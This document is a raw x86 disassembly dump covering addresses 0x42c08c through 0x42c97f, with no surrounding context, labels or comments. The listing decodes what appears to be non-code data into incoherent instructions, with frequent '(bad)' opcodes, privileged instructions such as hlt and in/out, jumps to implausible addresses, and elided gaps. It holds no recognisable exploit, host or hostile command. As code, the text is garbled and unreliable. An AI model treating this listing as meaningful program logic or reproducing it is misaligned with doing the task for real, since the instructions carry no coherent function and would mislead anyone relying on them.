  42c08c:	add    bh,cl
  42c08e:	pop    eax
  42c08f:	dec    eax
  42c090:	hlt    
  42c091:	fcmovne st,st(0)
  42c093:	fidivr WORD PTR [edi+0x46e38b2]
  42c099:	jmp    0x3f29c465
  42c09e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c09f:	test   esp,ebp
  42c0a1:	cwde   
  42c0a2:	mov    BYTE PTR [ebp-0x501ebe3f],0xfb
  42c0a9:	cs jo  0x42c0f3
  42c0ac:	cld    
  42c0ad:	jb     0x42c063
  42c0af:	cld    
  42c0b0:	repnz inc ecx
  42c0b2:	repnz les ecx,FWORD PTR [ebp-0x41f2bc44]
  42c0b9:	mov    ecx,0x608373e
  42c0be:	ror    BYTE PTR [eax],0xfb
  42c0c1:	aam    0x37
  42c0c3:	pop    ss
  42c0c4:	inc    eax
  42c0c5:	jmp    0xeec26e44
  42c0ca:	popf   
  42c0cb:	xor    DWORD PTR [edi],ebx
  42c0cd:	push   ebx
  42c0ce:	lock and al,BYTE PTR [eax]
  42c0d1:	lea    edx,ss:[edx]
  42c0d4:	add    al,0xff
  42c0d6:	aaa    
  42c0d7:	add    eax,0x9ce44352
  42c0dc:	lods   al,BYTE PTR ds:[esi]
  42c0dd:	add    dh,bl
  42c0df:	add    BYTE PTR [eax],al
  42c0e1:	test   DWORD PTR [eax],eax
	...
  42c0fb:	pop    ebp
  42c0fc:	cmc    
  42c0fd:	xorps  xmm2,XMMWORD PTR [esi]
  42c100:	jno    0x42c0ea
  42c102:	mov    ebx,0x8bf76e67
  42c107:	jge    0x42c163
  42c109:	(bad)  
  42c10a:	xor    bl,BYTE PTR [ebp+0x5a]
  42c10d:	aas    
  42c10e:	xor    ebp,DWORD PTR [ebx+0x52]
  42c111:	test   esi,esi
  42c113:	jmp    0xd2662328
  42c118:	pop    eax
  42c119:	mov    bh,0xfb
  42c11b:	repnz ins DWORD PTR es:[edi],dx
  42c11d:	test   al,al
  42c11f:	imul   ecx,DWORD PTR [edi],0x9f76c683
  42c125:	or     BYTE PTR gs:[esi],dh
  42c128:	(bad)  
  42c12a:	push   esi
  42c12b:	mov    dl,0xfb
  42c12d:	pop    ss
  42c12e:	push   ss
  42c12f:	popf   
  42c130:	or     BYTE PTR [edi-0x1],cl
  42c133:	dec    eax
  42c134:	pushf  
  42c135:	adc    DWORD PTR [eax+0x4d],eax
  42c138:	pop    ecx
  42c139:	adc    bh,bh
  42c13b:	dec    eax
  42c13c:	les    edx,FWORD PTR ds:0xd8791d40
  42c142:	mov    ebx,DWORD PTR [ebx]
  42c144:	fiadd  DWORD PTR [eax]
  42c146:	mov    esp,ebx
  42c148:	ins    DWORD PTR es:[edi],dx
  42c149:	adc    BYTE PTR [ebx-0xe],dl
  42c14c:	sti    
  42c14d:	das    
  42c14e:	push   ss
  42c14f:	pop    ebp
  42c150:	or     BYTE PTR [ebx],ch
  42c152:	rol    BYTE PTR [esi+0x4e],0x57
  42c156:	leave  
  42c157:	iret   
  42c158:	add    al,0x0
  42c15a:	push   0xffffffdd
  42c15c:	ins    BYTE PTR es:[edi],dx
  42c15d:	je     0x42c183
	...
  42c177:	add    cl,dl
  42c179:	ins    BYTE PTR es:[edi],dx
  42c17a:	je     0x42c1a0
  42c17c:	shr    DWORD PTR [ecx+esi*2+0x4],0xd2
  42c181:	cli    
  42c182:	pop    ds
  42c183:	push   ss
  42c184:	sbb    eax,0xf408ba01
  42c189:	popf   
  42c18a:	dec    edx
  42c18b:	xchg   eax,edx
  42c18d:	push   ds
  42c18e:	mov    ds:0x510c272c,eax
  42c193:	xchg   DWORD PTR [esi+esi*1-0x39317852],ebp
  42c19a:	dec    edi
  42c19b:	xchg   edx,edi
  42c19d:	adc    dl,BYTE PTR [ebp-0x79]
  42c1a0:	stos   BYTE PTR es:[edi],al
  42c1a1:	bound  ecx,QWORD PTR [edi+0x4]
  42c1a4:	jns    0x42c203
  42c1a6:	cmp    DWORD PTR [edx],eax
  42c1a8:	div    DWORD PTR [ebp-0x14]
  42c1ab:	test   DWORD PTR [edi+0x7b482bb8],0xb415c3c8
  42c1b5:	popf   
  42c1b6:	repnz adc ebx,DWORD PTR cs:[esi+0x5ba74ff]
  42c1be:	hlt    
  42c1bf:	je     0x42c1b5
  42c1c1:	popf   
  42c1c2:	add    BYTE PTR [ebp+0x28],0x6d
  42c1c6:	mov    WORD PTR [ebp-0x4],es
  42c1c9:	(bad)  
  42c1ca:	fsubrp st(7),st
  42c1cc:	adc    DWORD PTR [ebp-0x228e0001],ebx
  42c1d2:	sub    DWORD PTR [ebx],ebp
  42c1d4:	sub    ah,BYTE PTR [eax-0x35]
  42c1d7:	and    BYTE PTR [eax+0x44f698],ah
	...
  42c1f5:	adc    BYTE PTR [eax-0x19],dh
  42c1f8:	icebp  
  42c1f9:	mov    cl,0xe9
  42c1fb:	std    
  42c1fc:	jae    0x42c1f8
  42c1fe:	push   ds
  42c1ff:	xor    bl,al
  42c201:	hlt    
  42c202:	mov    dh,bl
  42c204:	test   BYTE PTR [ebx],al
  42c206:	jp     0x42c26b
  42c208:	mov    al,0xf5
  42c20a:	bound  ebx,QWORD PTR [ecx+0x57]
  42c20d:	mov    ebp,0x53fffade
  42c212:	sub    eax,esp
  42c214:	jmp    ebx
  42c216:	fwait
  42c217:	or     eax,0x29050230
  42c21c:	add    al,0x22
  42c21e:	(bad)
  42c221:	iret   
  42c222:	xor    ch,al
  42c224:	stos   DWORD PTR es:[edi],eax
  42c225:	lds    ebp,FWORD PTR [edx-0x662c23ac]
  42c22b:	sbb    al,0x8b
  42c22d:	mov    al,ds:0x9cc56e54
  42c232:	icebp  
  42c233:	mov    ah,0xb7
  42c235:	lahf   
  42c236:	jl     0x42c25c
  42c238:	mov    eax,0xaef14073
  42c23d:	lods   al,BYTE PTR ds:[esi]
  42c23e:	push   cs
  42c23f:	test   eax,0xc6a92189
  42c244:	shl    DWORD PTR [edx+ebp*4],0x14
  42c248:	or     al,0x12
  42c24a:	add    eax,0xaa043182
  42c24f:	hlt    
  42c250:	pop    es
  42c251:	outs   dx,DWORD PTR ds:[esi]
  42c252:	xor    al,0xed
  42c254:	mov    dh,0x9
  42c256:	popf   
  42c257:	aam    0x43
	...
  42c271:	add    ah,dh
  42c273:	mov    ebx,0x1ef40827
  42c278:	jmp    0xe5238333
  42c27d:	mov    dh,0xc8
  42c27f:	loopne 0x42c25d
  42c281:	mov    dh,0xc5
  42c283:	add    BYTE PTR [edx+0x11],al
  42c286:	in     al,dx
  42c287:	adc    ch,BYTE PTR [ecx-0x170295fd]
  42c28d:	push   eax
  42c28e:	jnp    0x42c229
  42c290:	data16 test al,0xc8
  42c293:	push   ebp
  42c294:	mov    ebx,0x6ead7b4e
  42c299:	mov    ch,0x73
  42c29b:	iret   
  42c29c:	inc    BYTE PTR [edi+0x7b]
  42c29f:	adc    edx,DWORD PTR [ecx+0x4]
  42c2a2:	in     al,dx
  42c2a3:	add    al,0xe9
  42c2a5:	cli    
  42c2a6:	jmp    0x42c2a1
  42c2a8:	stos   BYTE PTR es:[edi],al
  42c2a9:	mov    esi,0x62005644
  42c2ae:	mov    edx,0x74dd4ead
  42c2b3:	les    edi,FWORD PTR [edx-0x11]
  42c2b6:	test   ah,0x27
  42c2b9:	loope  0x42c259
  42c2bb:	fnsave [ebx+0x13]
  42c2be:	mov    ecx,DWORD PTR [edi]
  42c2c0:	int3   
  42c2c1:	hlt    
  42c2c2:	aaa    
  42c2c3:	add    eax,0xa9d2fa3d
  42c2c8:	sti    
  42c2c9:	xor    al,0x9d
  42c2cb:	scas   al,BYTE PTR es:[edi]
  42c2cc:	jne    0x42c2af
  42c2ce:	ins    BYTE PTR es:[edi],dx
  42c2cf:	aas    
  42c2d0:	aam    0x19
  42c2d2:	outs   dx,DWORD PTR ds:[esi]
  42c2d3:	aas    
  42c2d4:	or     al,0x13
	...
  42c2ee:	add    dh,dh
  42c2f0:	pushf  
  42c2f1:	push   ebp
  42c2f2:	jmp    0xa9c7c7ee
  42c2f7:	les    ecx,FWORD PTR [edx+esi*8]
  42c2fa:	and    al,0xa4
  42c2fc:	stos   BYTE PTR es:[edi],al
  42c2fd:	outs   dx,DWORD PTR ds:[esi]
  42c2fe:	in     al,dx
  42c2ff:	jo     0x42c341
  42c301:	fdivr  st(4),st
  42c303:	add    BYTE PTR [eax+0x74e7f6fb],al
  42c309:	add    DWORD PTR [esi],ecx
  42c30b:	ret    0xc951
  42c30e:	sub    edi,edi
  42c310:	add    al,0x2e
  42c312:	sub    DWORD PTR [esi+0x2bdcfbaf],ebx
  42c318:	lods   eax,DWORD PTR ds:[esi]
  42c319:	adc    eax,0x44ea19
  42c31e:	push   edx
  42c31f:	push   0xd951c181
  42c324:	mov    cl,0xfb
  42c326:	ss (bad) 
  42c328:	lods   eax,DWORD PTR ds:[esi]
  42c329:	je     0x42c330
  42c32b:	call   0xe368c352
  42c330:	loopne 0x42c349
  42c332:	push   ds
  42c333:	fneni(8087 only) 
  42c335:	pop    ss
  42c336:	push   ss
  42c337:	enter  0xfb00,0xf4
  42c33b:	push   edi
  42c33c:	cmovo  eax,DWORD PTR [eax]
  42c33f:	fnsave [ebx+0x6ef583c8]
  42c345:	pop    es
  42c346:	xchg   ebp,eax
  42c347:	or     eax,0x80000cc6
  42c34c:	jnp    0x42c33a
  42c34e:	sub    DWORD PTR [ecx+0x657afd],0x0
	...
  42c369:	add    BYTE PTR [eax],al
  42c36b:	add    BYTE PTR [ecx-0x55a8b4ff],ch
  42c371:	fadd   DWORD PTR [edi]
  42c373:	mov    ebp,eax
  42c375:	add    al,0xe
  42c377:	inc    eax
  42c378:	popf   
  42c379:	jno    0x42c3e9
  42c37b:	or     BYTE PTR [esi],ah
  42c37d:	leave  
  42c37e:	div    DWORD PTR [esi-0x6f]
  42c381:	jno    0x42c352
  42c383:	test   DWORD PTR [ebp-0xb],ecx
  42c386:	pop    es
  42c387:	add    DWORD PTR [esi+0x72],0xffffffe9
  42c38b:	mov    DWORD PTR [ebp-0x2474fffc],ebx
  42c391:	clc    
  42c392:	scas   eax,DWORD PTR es:[edi]
  42c393:	add    DWORD PTR [eax+eax*2],edx
  42c396:	hlt    
  42c397:	test   DWORD PTR [esi+0x88904f5],edx
  42c39d:	imul   esi,esi,0xc01a5ac0
  42c3a3:	mov    DWORD PTR [eax],edx
  42c3a5:	stc    
  42c3a6:	div    BYTE PTR [ebp+0x4d]
  42c3a9:	jg     0x42c3f0
  42c3ab:	hlt    
  42c3ac:	daa    
  42c3ad:	add    al,0x50
  42c3af:	jmp    DWORD PTR [eax]
  42c3b1:	cld    
  42c3b2:	not    BYTE PTR ds:0x4010a9
  42c3b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3b9:	enter  0xdb85,0x60
  42c3bd:	adc    bh,dh
  42c3bf:	jne    0x42c3da
  42c3c1:	jge    0x42c381
  42c3c3:	call   0x3a315a
  42c3c8:	mov    eax,ds:0x860974c0
  42c3cd:	out    0xb,eax
  42c3cf:	cmp    DWORD PTR [eax],eax
	...
  42c3e9:	hlt    
  42c3ea:	mov    ch,0x2b
  42c3ec:	iret   
  42c3ed:	bsf    eax,DWORD PTR [eax+0x1312f3c7]
  42c3f4:	jg     0x42c3e5
  42c3f6:	pushf  
  42c3f7:	sub    cl,BYTE PTR [ecx]
  42c3f9:	mov    ebx,0xf7dfb358
  42c3fe:	popf   
  42c3ff:	jmp    esi
  42c401:	add    ebx,DWORD PTR ds:0x9df4feb8
  42c407:	push   DWORD PTR [ebx+edi*8+0x56]
  42c40b:	cmp    bh,ah
  42c40d:	sub    bh,bh
  42c40f:	add    eax,DWORD PTR [eax]
  42c411:	mov    bl,0xe7
  42c413:	adc    edi,ebx
  42c415:	and    dh,BYTE PTR [esi+0x6ef872b4]
  42c41b:	int3   
  42c41c:	test   DWORD PTR [ecx+esi*8+0x5ebf7f00],esi
  42c423:	cmp    BYTE PTR [ebp-0x78],0x9d
  42c427:	sub    ecx,DWORD PTR [ecx]
  42c429:	or     DWORD PTR [eax],0xffffffb8
  42c42c:	sti    
  42c42d:	loope  0x42c3fc
  42c42f:	or     eax,0x88def440
  42c434:	mov    edi,0xcc174cf
  42c439:	hlt    
  42c43a:	or     BYTE PTR [ecx+0x32977ec],cl
  42c440:	das    
  42c441:	xor    al,0x6d
  42c443:	dec    edi
  42c444:	lea    edi,[ecx-0x5bafb14b]
  42c44a:	ret    
  42c44b:	add    ecx,DWORD PTR [ebp+0x0]
	...
  42c465:	add    BYTE PTR [ecx-0x797b0af],dh
  42c46b:	popf   
  42c46c:	call   DWORD PTR [edi-0x3cf88fd5]
  42c472:	mov    ecx,0xf4fffde9
  42c477:	popf   
  42c478:	mov    esp,0xf9040c45
  42c47d:	fmul   QWORD PTR [ebx]
  42c47f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c480:	and    bh,BYTE PTR [esi]
  42c482:	add    BYTE PTR [esi+esi*8+0x3],bh
  42c486:	hlt    
  42c487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c488:	hlt    
  42c489:	mov    bh,0x9
  42c48b:	inc    ebp
  42c48c:	jmp    0x294d913d
  42c491:	inc    ebx
  42c492:	lods   eax,DWORD PTR ds:[esi]
  42c493:	ret    
  42c494:	in     eax,dx
  42c495:	add    eax,DWORD PTR [ecx+0x7a]
  42c498:	std    
  42c499:	push   ecx
  42c49a:	pop    edx
  42c49b:	add    DWORD PTR [esi],edx
  42c49d:	les    edi,FWORD PTR [ecx+0x38]
  42c4a0:	fst    QWORD PTR [ebp+0x34]
  42c4a3:	push   ebp
  42c4a4:	aas    
  42c4a5:	or     bh,BYTE PTR [edi+0x397ce130]
  42c4ab:	test   eax,0xefc19c2
  42c4b0:	sub    DWORD PTR [edi+eiz*4],eax
  42c4b3:	int    0xce
  42c4b5:	ret    
  42c4b6:	xor    al,0xbc
  42c4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c4b9:	or     ah,dh
  42c4bb:	push   ecx
  42c4bc:	cmp    al,0xf7
  42c4be:	mov    ds:0xc184264f,al
  42c4c3:	int3   
  42c4c4:	mov    ah,0x47
  42c4c6:	hlt    
  42c4c7:	add    al,0x32
  42c4c9:	cmp    DWORD PTR [eax],eax
	...
  42c4e3:	sub    DWORD PTR [edi-0xf],esp
  42c4e6:	shr    DWORD PTR [ebx],1
  42c4e8:	add    eax,0xd09b313
  42c4ed:	xlat   BYTE PTR ds:[ebx]
  42c4ee:	inc    ebx
  42c4ef:	hlt    
  42c4f0:	test   BYTE PTR [ebx+ecx*8+0x3e94231],ch
  42c4f7:	ror    DWORD PTR [ebx],0x51
  42c4fa:	sahf   
  42c4fb:	inc    esi
  42c4fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c4fd:	push   edx
  42c4fe:	mov    BYTE PTR [ecx+esi*1],dh
  42c501:	stc    
  42c502:	retf   0xc8f9
  42c505:	and    al,0x47
  42c507:	hlt    
  42c508:	adc    eax,0x7cf44602
  42c50d:	add    ah,dl
  42c50f:	das    
  42c510:	enter  0xe93f,0xad
  42c514:	test   eax,0x44e20515
  42c519:	add    BYTE PTR [ebx-0x54],dh
  42c51c:	loopne 0x42c531
  42c51e:	add    DWORD PTR [ebx+ebp*4-0xf8cf105],eax
  42c525:	daa    
  42c526:	fbstp  TBYTE PTR [edi]
  42c528:	add    eax,0xad62e766
  42c52d:	dec    edi
  42c52e:	sahf   
  42c52f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c530:	shl    BYTE PTR [esi-0x28],cl
  42c533:	icebp  
  42c534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c535:	push   edx
  42c536:	jb     0x42c5a7
  42c538:	test   eax,0x258f72d2
  42c53d:	std    
  42c53e:	(bad)  
  42c53f:	add    eax,DWORD PTR [eax]
  42c541:	jg     0x42c511
  42c543:	data16 das 
  42c545:	(bad)  
  42c546:	cli    
	...
  42c55f:	add    BYTE PTR [edx-0x20aca83],bh
  42c565:	inc    esp
  42c566:	add    BYTE PTR [edi+eiz*2],bl
  42c569:	rcl    BYTE PTR [ebx-0x52],cl
  42c56c:	lods   eax,DWORD PTR ds:[esi]
  42c56d:	dec    ecx
  42c56e:	pop    edx
  42c56f:	inc    esp
  42c570:	or     ah,BYTE PTR [esi+0x57]
  42c573:	stos   DWORD PTR es:[edi],eax
  42c574:	sti    
  42c575:	add    al,0x55
  42c577:	bound  ebx,QWORD PTR [ebx+0x25]
  42c57a:	in     al,dx
  42c57b:	cmc    
  42c57c:	retf   0xd6d5
  42c57f:	pop    ds
  42c580:	pop    eax
  42c581:	or     al,bl
  42c583:	pushf  
  42c584:	mov    edx,0xe5bc7504
  42c589:	cld    
  42c58a:	fldcw  WORD PTR [edx]
  42c58c:	clc    
  42c58d:	push   edx
  42c58e:	sti    
  42c58f:	cld    
  42c590:	push   esi
  42c592:	aas    
  42c593:	jmp    0x351acde7
  42c598:	mov    dl,0x4
  42c59a:	jne    0x42c58f
  42c59c:	(bad)  
  42c59d:	and    esi,edx
  42c59f:	add    BYTE PTR [edx+0x69c08472],dh
  42c5a5:	adc    BYTE PTR [edi+0x3bd50105],bh
  42c5ab:	add    BYTE PTR [edx-0x66],dl
  42c5ae:	cmp    eax,0xd7fcdb00
  42c5b3:	fisttp QWORD PTR [esi+0x1]
  42c5b6:	add    DWORD PTR [esi-0x1e],edx
  42c5b9:	or     al,0x1c
  42c5bb:	adc    bl,BYTE PTR [ebp-0x1aba7df8]
  42c5c1:	cmp    esp,DWORD PTR [edx+0x2]
	...
  42c5dc:	add    BYTE PTR ds:0xe2fff898,al
  42c5e2:	aaa    
  42c5e3:	not    DWORD PTR ds:0x3ffeb5
  42c5e9:	inc    esp
  42c5ea:	dec    esp
  42c5eb:	clc    
  42c5ec:	adc    ebp,0x56
  42c5ef:	jne    0x42c5f5
  42c5f1:	fmulp  st(0),st
  42c5f3:	jecxz  0x42c66d
  42c5f5:	push   ss
  42c5f6:	pushf  
  42c5f7:	not    DWORD PTR ds:0x534f08dd
  42c5fd:	(bad)  
  42c5fe:	and    ecx,DWORD PTR [ebp-0x4]
  42c601:	cld    
  42c602:	cmp    DWORD PTR [ebp+0x4b38514d],ecx
  42c608:	push   ebx
  42c609:	adc    bh,bh
  42c60b:	(bad)  
  42c60c:	inc    ebp
  42c60e:	cmp    eax,0xa0c08950
  42c613:	mov    BYTE PTR [ebp-0x7f],bl
  42c616:	push   esi
  42c617:	into   
  42c618:	xor    DWORD PTR [ebp+0x56],0x75
  42c61c:	inc    ebx
  42c61d:	loop   0x42c61a
  42c61f:	retf   
  42c620:	adc    eax,0x1e3d090d
  42c625:	cmp    cl,BYTE PTR [eax]
  42c627:	add    BYTE PTR [ebp-0x15],dh
  42c62a:	and    DWORD PTR [ebp-0x4],eax
  42c62d:	push   ss
  42c62e:	retf   0x2c74
  42c631:	hlt    
  42c632:	inc    ebp
  42c633:	push   ecx
  42c634:	dec    ebx
  42c635:	hlt    
  42c636:	lods   eax,DWORD PTR ds:[esi]
  42c637:	jbe    0x42c67e
  42c639:	cld    
  42c63a:	push   es
  42c63b:	lds    esi,FWORD PTR [edi+edx*8+0x7e]
  42c63f:	push   esp
  42c640:	lea    eax,[eax]
	...
  42c65a:	mov    cl,0xd9
  42c65c:	push   ebx
  42c65d:	sti    
  42c65e:	mov    ecx,esi
  42c660:	mov    al,0x75
  42c662:	cld    
  42c663:	pop    esi
  42c664:	push   esp
  42c665:	push   ebx
  42c666:	add    edi,DWORD PTR [ecx-0x59]
  42c669:	sti    
  42c66a:	and    dh,BYTE PTR [ecx]
  42c66c:	les    esi,FWORD PTR [edi+edi*8+0x12]
  42c670:	xor    ecx,DWORD PTR [eax]
  42c672:	fdiv   QWORD PTR [esi+0x40]
  42c675:	add    ah,dh
  42c677:	adc    al,0x4b
  42c679:	or     bl,bl
  42c67b:	and    BYTE PTR [edi+0x1959e9fb],ah
  42c681:	inc    eax
  42c682:	hlt    
  42c683:	push   ss
  42c684:	inc    edx
  42c685:	or     BYTE PTR [ebx],ah
  42c687:	in     al,0x4c
  42c689:	leave  
  42c68a:	mov    dh,0xb1
  42c68c:	call   DWORD PTR [edi+edi*2+0x61]
  42c690:	test   ah,ch
  42c692:	clc    
  42c693:	(bad)  
  42c694:	push   ebp
  42c695:	push   ebx
  42c696:	out    0x6d,al
  42c698:	xchg   edi,eax
  42c699:	mov    ebx,DWORD PTR [edx+ebx*2+0x56197fb0]
  42c6a0:	inc    DWORD PTR [esi-0xbbd8d54]
  42c6a6:	hlt    
  42c6a7:	xchg   ebp,eax
  42c6a8:	(bad)  
  42c6a9:	push   DWORD PTR [edx+0x7300b0f0]
  42c6af:	clc    
  42c6b0:	mov    bh,0x8d
  42c6b2:	loope  0x42c639
  42c6b4:	xchg   edi,eax
  42c6b5:	lods   al,BYTE PTR ds:[esi]
  42c6b6:	mov    dl,0xad
  42c6b8:	inc    DWORD PTR [esi-0x3f7cea27]
	...
  42c6d6:	add    al,cl
  42c6d8:	iret   
  42c6d9:	jp     0x42c720
  42c6db:	inc    eax
  42c6dc:	add    al,0xb9
  42c6de:	pop    eax
  42c6df:	fiadd  DWORD PTR [edi+ecx*8]
  42c6e2:	loope  0x42c68e
  42c6e4:	mov    ds:0x45049ffc,eax
  42c6e9:	jmp    0x43c9eb6a
  42c6ee:	and    BYTE PTR [ecx+0x1f463b12],ch
  42c6f4:	test   BYTE PTR [eax+esi*4-0x63e4eaed],dh
  42c6fb:	imul   DWORD PTR [esi]
  42c6fd:	icebp  
  42c6fe:	push   ecx
  42c6ff:	jns    0x42c69b
  42c701:	xchg   ebp,eax
  42c702:	sti    
  42c703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c704:	lods   al,BYTE PTR ds:[esi]
  42c705:	push   ss
  42c706:	inc    ecx
  42c707:	hlt    
  42c708:	add    al,0xd6
  42c70a:	mov    al,0x46
  42c70c:	mov    ds:0x44f1f7dc,al
  42c711:	jmp    0x93857e92
  42c716:	dec    esp
  42c717:	mov    ebp,0xd87c94c6
  42c71c:	xor    al,0x69
  42c71e:	icebp  
  42c71f:	stos   DWORD PTR es:[edi],eax
  42c720:	shl    BYTE PTR [esi],0x4
  42c723:	hlt    
  42c724:	pop    ss
  42c725:	adc    DWORD PTR [esi+0x6e],edx
  42c728:	or     eax,0x3af443ab
  42c72d:	ret    0xfc19
  42c730:	imul   BYTE PTR [eax]
  42c732:	add    al,0x74
  42c734:	loopne 0x42c6c6
  42c736:	rcl    ebx,1
  42c738:	add    al,0xe9
  42c73a:	cmp    BYTE PTR [eax],al
	...
  42c754:	loop   0x42c702
  42c756:	repnz mov eax,0xc465a27f
  42c75c:	add    ah,dh
  42c75e:	test   eax,0x26c05009
  42c763:	add    al,0xdf
  42c765:	jmp    0x878cb90
  42c76a:	mov    eax,ds:0x51bd1
  42c76f:	call   0xcd58651d
  42c774:	in     eax,0x44
  42c776:	add    bh,al
  42c778:	je     0x42c7c2
  42c77a:	cld    
  42c77b:	mov    ecx,0x620c188a
  42c780:	mov    ebp,0x32e9660c
  42c785:	dec    eax
  42c786:	cld    
  42c787:	stc    
  42c788:	test   DWORD PTR [eax+eax*1],0xfb9a1f51
  42c78f:	ss test al,0x9d
  42c792:	jne    0x42c775
  42c794:	pop    edx
  42c795:	clc    
  42c796:	adc    edi,edi
  42c798:	mov    bh,0x4
  42c79a:	test   DWORD PTR [ecx],ebp
  42c79c:	mov    esp,0x6e4d6812
  42c7a1:	inc    ebp
  42c7a2:	add    BYTE PTR [esi],cl
  42c7a4:	sub    eax,0xdfdcfb11
  42c7a9:	hlt    
  42c7aa:	aas    
  42c7ab:	jmp    0xec2a2995
  42c7b0:	inc    edi
  42c7b1:	add    al,0xc9
  42c7b3:	sub    ecx,eax
  42c7b5:	mov    eax,ds:0x7254
	...
  42c7ce:	add    BYTE PTR [eax],al
  42c7d0:	add    BYTE PTR [ebx+0x21],ah
  42c7d3:	in     al,dx
  42c7d4:	cmp    eax,ebx
  42c7d6:	add    al,0x8
  42c7d8:	jmp    0x1f7374d4
  42c7dd:	lock add al,0x89
  42c7e0:	sub    al,0x68
  42c7e2:	xchg   eax,eax
  42c7e4:	xor    al,0x9b
  42c7e6:	daa    
  42c7e7:	or     BYTE PTR [esi+0x2911d4ec],dh
  42c7ed:	lock repnz mov edi,0x37790
  42c7f4:	jmp    0x4002ba1f
  42c7f9:	retf   
  42c7fa:	(bad)  
  42c7fb:	jge    0x42c78d
  42c7fd:	xor    DWORD PTR [edi-0x8],eax
  42c800:	add    BYTE PTR [ebp+0x3b],cl
  42c803:	add    DWORD PTR [ebp+0x65],0x1e
  42c807:	inc    eax
  42c808:	or     ah,dl
  42c80a:	dec    esp
  42c80b:	fmul   QWORD PTR [ebx+0x40830510]
  42c811:	inc    ebp
  42c812:	and    BYTE PTR [ebp-0x20],al
  42c815:	(bad)  
  42c816:	dec    esp
  42c817:	adc    al,0xc7
  42c819:	pusha  
  42c81a:	jge    0x42c816
  42c81c:	call   FWORD PTR ds:0x61c08505
  42c822:	fwait
  42c823:	mov    BYTE PTR [ebp-0x4f],al
  42c826:	retf   0xe845
  42c829:	push   ds
  42c82a:	add    eax,0xec9e0000
  42c82f:	repz add bl,dl
  42c832:	dec    esp
  42c833:	test   DWORD PTR [eax],0x0
	...
  42c84d:	add    ah,ah
  42c84f:	iret   
  42c850:	add    BYTE PTR [eax],al
  42c852:	fisttp QWORD PTR [ebp-0x7c1e8b40]
  42c858:	clc    
  42c859:	add    edx,ebp
  42c85b:	(bad)  
  42c85c:	out    dx,eax
  42c85d:	add    ch,cl
  42c85f:	add    al,0x83
  42c861:	jne    0x42c83c
  42c863:	sbb    ebx,DWORD PTR [ebp+0x8]
  42c866:	sub    ch,dl
  42c868:	clc    
  42c869:	jmp    0x42c82f
  42c86b:	sbb    eax,0x50460875
  42c870:	or     al,0x8d
  42c872:	dec    eax
  42c873:	jno    0x42c802
  42c875:	inc    ebp
  42c876:	lea    edi,[ecx]
  42c878:	div    DWORD PTR [esi-0x5b]
  42c87b:	jno    0x42c8eb
  42c87d:	add    al,0x5a
  42c87f:	clc    
  42c880:	call   DWORD PTR ds:0xc08508dd
  42c886:	stos   BYTE PTR es:[edi],al
  42c887:	xchg   esi,ebx
  42c889:	add    BYTE PTR [ebp+0x1d45ee04],cl
  42c88f:	add    al,0x74
  42c891:	jo     0x42c887
  42c893:	and    al,BYTE PTR [ebx-0x4c]
  42c896:	jno    0x42c906
  42c898:	cmp    BYTE PTR [ebp+ebp*2-0xf],al
  42c89c:	mov    bh,0xe9
  42c89e:	inc    ebp
  42c89f:	scas   al,BYTE PTR es:[edi]
  42c8a0:	(bad)  
  42c8a1:	(bad)  
  42c8a2:	jg     0x42c88d
  42c8a4:	or     eax,DWORD PTR [ebp-0x78f565c3]
  42c8aa:	cmc    
  42c8ab:	sbb    BYTE PTR [ebx-0x14],dl
  42c8ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8af:	ds xor esi,eax
	...
  42c8ca:	add    bh,al
  42c8cc:	pop    edi
  42c8cd:	lods   al,BYTE PTR ds:[esi]
  42c8ce:	push   eax
  42c8cf:	lock sub esp,eax
  42c8d2:	or     edi,DWORD PTR [eax+0x22]
  42c8d5:	add    al,0x0
  42c8d7:	hlt    
  42c8d8:	adc    al,BYTE PTR [ebx-0x14]
  42c8db:	jns    0x42c8cb
  42c8dd:	sub    DWORD PTR [eax],ebx
  42c8df:	or     ebx,DWORD PTR [ecx+0x13]
  42c8e2:	xchg   DWORD PTR [ecx-0x1b8a5303],ebp
  42c8e8:	adc    bh,BYTE PTR [ecx-0x530c1d18]
  42c8ee:	sti    
  42c8ef:	jo     0x42c8de
  42c8f1:	cld    
  42c8f2:	or     DWORD PTR [ecx+0x6fffffad],0xffffffa7
  42c8f9:	pop    ss
  42c8fa:	add    ah,bh
  42c8fc:	lods   eax,DWORD PTR ds:[esi]
  42c8fd:	(bad)  
  42c8fe:	cli    
  42c8ff:	inc    ecx
  42c900:	sahf   
  42c901:	js     0x42c8cd
  42c903:	ret    
  42c904:	fld    QWORD PTR [edi]
  42c906:	mov    DWORD PTR [ecx],esi
  42c908:	rol    BYTE PTR [edx+0x268833c0],cl
  42c90e:	or     eax,0x15bb98ab
  42c913:	xor    al,0xae
  42c915:	jmp    0x474:0xffadd32e
  42c91c:	pusha  
  42c91d:	inc    edx
  42c91e:	mov    al,0xd4
  42c920:	(bad)  [edx]
  42c922:	xchg   DWORD PTR [ecx],edi
  42c924:	add    eax,0x19b486b1
  42c929:	outs   dx,DWORD PTR ds:[esi]
  42c92a:	jmp    0x42c922
  42c92c:	sbb    edx,esp
  42c92e:	sbb    DWORD PTR [eax],eax
	...
  42c948:	cmc    
  42c949:	lahf   
  42c94a:	push   ss
  42c94b:	or     BYTE PTR [edi-0x7],bl
  42c94e:	loopne 0x42c965
  42c950:	mov    ah,0x4
  42c952:	fs ret 
  42c954:	leave  
  42c955:	xor    al,0xab
  42c957:	add    al,0xf5
  42c959:	test   ah,ch
  42c95b:	stos   DWORD PTR es:[edi],eax
  42c95c:	cmc    
  42c95d:	sbb    ebx,ebp
  42c95f:	cmp    DWORD PTR [ecx-0xec81763],0xffffff9f
  42c966:	fcom   QWORD PTR [ebx]
  42c968:	jns    0x42c9b3
  42c96a:	sub    eax,0x4234f419
  42c96f:	ss or  al,0x9f
  42c972:	aam    0xaf
  42c974:	in     al,0x44
  42c976:	jmp    0xe946d369
  42c97b:	add    ebp,edi
  42c97d:	mov    esp,ebp
  42c97f:	lods   al,BYTE PTR ds:[esi]
